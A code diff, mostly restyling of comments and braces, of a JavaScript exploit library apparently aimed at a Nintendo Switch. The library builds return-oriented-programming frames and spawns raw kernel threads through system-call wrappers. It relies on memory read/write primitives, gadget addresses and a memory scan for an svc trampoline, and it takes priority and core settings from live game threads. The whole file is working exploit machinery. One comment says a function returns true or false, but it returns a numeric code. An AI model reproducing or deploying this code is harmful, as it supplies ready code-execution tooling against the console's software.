@@ -1,20 +1,28 @@
-// Raw thread helpers — bypass nn::os::CreateThread using bare SVC wrappers.
-// nn::os::CreateThread hangs in bookkeeping; raw svcCreateThread works.
-// call_rop supports 6 args (x0-x5), matching svcCreateThread's signature.
+/*
+ * Raw thread helpers. They skip nn::os::CreateThread and go straight to the bare
+ * SVC wrappers: the nn::os path hangs inside its own bookkeeping, while
+ * svcCreateThread works. call_rop takes 6 arguments (x0-x5), which is exactly what
+ * svcCreateThread expects.
+ */
 
 var RAW_THREAD_STACK_SIZE = 0x10000;
 
-// ARM64 encoding: svc #0x0F = 0xD40001E1, ret = 0xD65F03C0.
+// ARM64 encodings: svc #0x0F is 0xD40001E1, ret is 0xD65F03C0.
 var SVC_0F_ENCODING = 0xD40001E1n;
 var RET_ENCODING = 0xD65F03C0n;
 
-// Scan SDK memory near the known SVC_GetThreadCoreMask wrapper to find
-// the svc #0x0F (SetThreadCoreMask) trampoline. Only accepts a match
-// where the very next instruction is ret — the signature of a standalone
-// SVC wrapper. This rejects svc #0x0F appearing mid-function or as data.
-// Returns the address of the svc instruction or 0n on failure.
+/*
+ * Scan SDK memory around the known SVC_GetThreadCoreMask wrapper for the
+ * svc #0x0F (SetThreadCoreMask) trampoline. A match only counts when a ret sits
+ * on the very next instruction, which is what a standalone SVC wrapper looks
+ * like. That condition rejects an svc #0x0F found mid-function or read as data.
+ *
+ * Returns the address of the svc instruction, or 0n when the scan fails.
+ */
 function findSvcSetCoreMask() {
-    if (SVC_SetThreadCoreMask !== 0n) return SVC_SetThreadCoreMask;
+    if (SVC_SetThreadCoreMask !== 0n) {
+        return SVC_SetThreadCoreMask;
+    }
 
     var base = SVC_GetThreadCoreMask;
 
@@ -35,24 +43,34 @@ function findSvcSetCoreMask() {
     return 0n;
 }
 
-// Pin a raw thread to a single core by restricting its affinity mask.
-// Must be called after createRawWorker and before startRawWorker.
+/*
+ * Pin a raw thread to one core by narrowing its affinity mask. Call it after
+ * createRawWorker and before startRawWorker.
+ */
 function pinWorkerToCore(handle, core) {
-    if (SVC_SetThreadCoreMask === 0n) return 0xFFFFFFFF;
+    if (SVC_SetThreadCoreMask === 0n) {
+        return 0xFFFFFFFF;
+    }
 
     var mask = 1n << BigInt(core);
     var rc = call_rop(SVC_SetThreadCoreMask,
-        BigInt(handle), BigInt(core), mask);
+                      BigInt(handle), BigInt(core), mask);
 
     return Number(rc) >>> 0;
 }
 
-// Walk the nn::os thread manager linked list to borrow a valid priority
-// and core mask from a live game thread.
-// Returns { priority, core, handle, nodes } or null on failure.
+/*
+ * Walk the nn::os thread manager linked list and pick up a valid priority and
+ * core mask from a live game thread.
+ *
+ * Returns { priority, core, handle, nodes }, or null when the walk fails.
+ */
 function borrowThreadScheduling() {
     var manager = read64(THREAD_MANAGER_PTR);
-    if (!manager || manager === 0n) return null;
+
+    if (!manager || manager === 0n) {
+        return null;
+    }
 
     var sentinel = manager + 0xF8n;
     var node = read64(manager + 0xF8n);
@@ -62,7 +80,11 @@ function borrowThreadScheduling() {
 
     for (; i < 64 && node !== sentinel && node !== 0n; i++) {
         var key = node.toString();
-        if (seen[key]) break;
+
+        if (seen[key]) {
+            break;
+        }
+
         seen[key] = true;
 
         var handle = Number(read32(node + 0x1B0n)) >>> 0;
@@ -72,22 +94,30 @@ function borrowThreadScheduling() {
             var prioBuf = allocPage(0x10);
             write64(prioBuf, 0n);
             var rc = call_rop(SVC_GetThreadPriority, prioBuf, BigInt(handle));
+
             if (rc === 0n) {
                 var prio = Number(read32(prioBuf)) >>> 0;
                 var maskBuf = allocPage(0x20);
                 write64(maskBuf, 0n);
                 write64(maskBuf + 8n, 0n);
                 var rc2 = call_rop(SVC_GetThreadCoreMask, maskBuf, maskBuf + 8n, BigInt(handle));
+
                 if (rc2 === 0n) {
                     var idealCore = Number(read32(maskBuf)) >>> 0;
                     var mask = read64(maskBuf + 8n);
+
                     if (prio > 0 && prio < 64 && mask > 0n) {
                         var useCore = idealCore;
+
                         if (useCore === 0xFFFFFFFF || useCore > 7) {
                             for (var bit = 0; bit < 8; bit++) {
-                                if (mask & (1n << BigInt(bit))) { useCore = bit; break; }
+                                if (mask & (1n << BigInt(bit))) {
+                                    useCore = bit;
+                                    break;
+                                }
                             }
                         }
+
                         if (!best || prio < best.priority) {
                             best = {
                                 priority: prio,
@@ -99,19 +129,26 @@ function borrowThreadScheduling() {
                 }
             }
         }
+
         node = next;
     }
 
-    if (!best) return null;
+    if (!best) {
+        return null;
+    }
+
     best.nodes = i;
     return best;
 }
 
-// ── Raw-thread frame building ───────────────────────────────────────
+// ----- Raw-thread frame building -----
 
-// Build a ROP frame for a raw thread (uses SVC_ExitThread at chain end).
-// calls: array of { fn, args: [x0, x1, x2, x3] }
-// Returns: { frame, size, count }
+/*
+ * Build a ROP frame a raw thread can run. The chain ends with SVC_ExitThread.
+ *
+ * `calls` is an array of { fn, args: [x0, x1, x2, x3] }, and the result is
+ * { frame, size, count }.
+ */
 function buildRawFrame(calls) {
     var count = calls.length;
     var tables = 0x1000;
@@ -157,13 +194,20 @@ function buildRawFrame(calls) {
     return { frame: frame, size: size, count: count };
 }
 
-// ── Thread lifecycle ────────────────────────────────────────────────
+// ----- Thread lifecycle -----
 
-// Create, but do not start, a raw kernel thread running a ROP frame.
-// Reusable buffers may provide { stack, handleBuf } for repeated waves.
+/*
+ * Create a raw kernel thread that runs a ROP frame, without starting it.
+ * Callers that relaunch workers can pass reusable buffers shaped
+ * { stack, handleBuf }.
+ */
 function createRawWorker(frameAddr, scheduling, reusable) {
-    // Callers that launch workers repeatedly can provide stable buffers here.
-    // Reusing them avoids one 64 KiB malloc-backed stack per worker per wave.
+
+    /*
+     * Callers that launch workers over and over can hand stable buffers in here.
+     * Reusing them saves the 64 KiB malloc-backed stack every worker would
+     * otherwise allocate on every wave.
+     */
     reusable = reusable || {};
     var stack = reusable.stack ? BigInt(reusable.stack) : allocPage(RAW_THREAD_STACK_SIZE);
     call_rop(GADGET_MEMSET, stack, 0n, BigInt(RAW_THREAD_STACK_SIZE));
@@ -172,15 +216,17 @@ function createRawWorker(frameAddr, scheduling, reusable) {
     var handleBuf = reusable.handleBuf ? BigInt(reusable.handleBuf) : allocPage(0x10);
     write64(handleBuf, 0n);
 
-    // svcCreateThread(&out_handle, entry, arg, stack_top, priority, core)
-    // call_rop supports 6 args → maps to x0-x5
+    /*
+     * svcCreateThread(&out_handle, entry, arg, stack_top, priority, core).
+     * call_rop takes 6 arguments and maps them straight onto x0-x5.
+     */
     var rc = call_rop(SVC_CreateThread,
-        handleBuf,                          // x0: &out_handle
-        GADGET_LONGJMP,                     // x1: entry point (longjmp into ROP chain)
-        frameAddr,                          // x2: argument (frame address)
-        stackTop,                           // x3: stack top
-        BigInt(scheduling.priority),        // x4: priority
-        BigInt(scheduling.core)             // x5: processor core
+                      handleBuf,                          // x0: &out_handle
+                      GADGET_LONGJMP,                     // x1: entry point (longjmp into ROP chain)
+                      frameAddr,                          // x2: argument (frame address)
+                      stackTop,                           // x3: stack top
+                      BigInt(scheduling.priority),        // x4: priority
+                      BigInt(scheduling.core)             // x5: processor core
     );
 
     if (rc !== 0n) {
@@ -192,20 +238,27 @@ function createRawWorker(frameAddr, scheduling, reusable) {
     return { handle: handle, rc: 0, stack: stack, stackTop: stackTop, handleBuf: handleBuf, started: false };
 }
 
-// Start a thread returned by createRawWorker().
 function startRawWorker(worker) {
-    if (!worker || worker.rc !== 0 || !worker.handle || worker.started) return 0xFFFFFFFF;
+    if (!worker || worker.rc !== 0 || !worker.handle || worker.started) {
+        return 0xFFFFFFFF;
+    }
+
     var startRc = call_rop(SVC_StartThread, BigInt(worker.handle));
+
     if (startRc !== 0n) {
         worker.rc = Number(startRc) >>> 0;
         return worker.rc;
     }
+
     worker.started = true;
     return 0;
 }
 
-// Wait for a raw thread to finish using svcWaitSynchronization.
-// Returns true if the thread exited, false on timeout.
+/*
+ * Block on svcWaitSynchronization until the raw thread exits.
+ *
+ * Returns true when the thread exited, false on timeout.
+ */
 function waitRawThread(handle, timeoutNs, reusableWaitBuf) {
     timeoutNs = timeoutNs || 5000000000n; // 5 seconds default
     var waitBuf = reusableWaitBuf ? BigInt(reusableWaitBuf) : allocPage(0x20);
@@ -213,16 +266,16 @@ function waitRawThread(handle, timeoutNs, reusableWaitBuf) {
     write32(waitBuf + 8n, BigInt(handle)); // handles array (1 handle)
 
     var rc = call_rop(SVC_WaitSync,
-        waitBuf,                    // x0: &out_index
-        waitBuf + 8n,               // x1: handles array
-        1n,                         // x2: handle count
-        timeoutNs                   // x3: timeout in nanoseconds
+                      waitBuf,                    // x0: &out_index
+                      waitBuf + 8n,               // x1: handles array
+                      1n,                         // x2: handle count
+                      timeoutNs                   // x3: timeout in nanoseconds
     );
 
     return Number(rc) >>> 0;
 }
 
-// Close a raw thread handle after it has exited.
+// Close a raw thread handle once the thread has exited.
 function closeRawThread(handle) {
     call_rop(F_CloseHandle, BigInt(handle));
 }
